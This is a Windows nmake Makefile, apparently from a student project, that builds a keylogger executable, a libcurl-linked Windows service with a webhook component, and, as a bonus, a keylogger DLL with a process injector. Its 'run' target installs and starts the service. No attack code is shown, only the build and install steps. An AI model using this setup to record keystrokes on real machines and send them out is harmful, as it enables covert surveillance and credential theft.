SRCS = keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c
FLAGS = /Wall /WX
RC_FILE = res\version.rc
RES_FILE = res\version.res
LIBS = user32.lib advapi32.lib wtsapi32.lib
VCPKG_ROOT = vcpkg
CURL_INCLUDE = /I"$(VCPKG_ROOT)\installed\x64-windows\include"
CURL_LIB = "$(VCPKG_ROOT)\installed\x64-windows\lib\libcurl.lib"

all: $(RES_FILE) winkey.exe svc.exe

$(RES_FILE): $(RC_FILE)
	rc /fo $(RES_FILE) $(RC_FILE)

winkey.exe: $(SRCS) keylog\exemain.c
	cl $(FLAGS) /Fe$@ $** $(RES_FILE) user32.lib psapi.lib


svc.exe:
	 cl $(FLAGS) /EHsc -I keylog $(CURL_INCLUDE) /Fe$@ service\svc.cpp service\webhook.cpp $(LIBS) $(CURL_LIB)

bonus: keylogger.dll injector.exe

keylogger.dll: keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c keylog/dllmain.c
	cl /LD $(FLAGS) keylog\keylogger.c keylog\init_logger.c keylog\sys_getter.c keylog\dllmain.c /link user32.lib /Fe:keylogger.dll

injector.exe: keylog/injector.c $(RES_FILE)
	cl $(FLAGS) keylog\injector.c $(RES_FILE) user32.lib psapi.lib /Fe:winkey.exe

clean:
	del /Q *.obj 2>nul

fclean: clean
	@echo "Cleaning up..."
	start svc.exe stop
	start svc.exe delete
	del /Q res\*.res 2>nul
	del /Q *.exe 2>nul
	del /Q *.dll 2>nul

run: all
	@echo "Running Winkey and Svc..."
	start svc.exe install
	start svc.exe start

ntm: re
	start svc.exe install
	start svc.exe start
	start svc.exe stop

re: fclean all
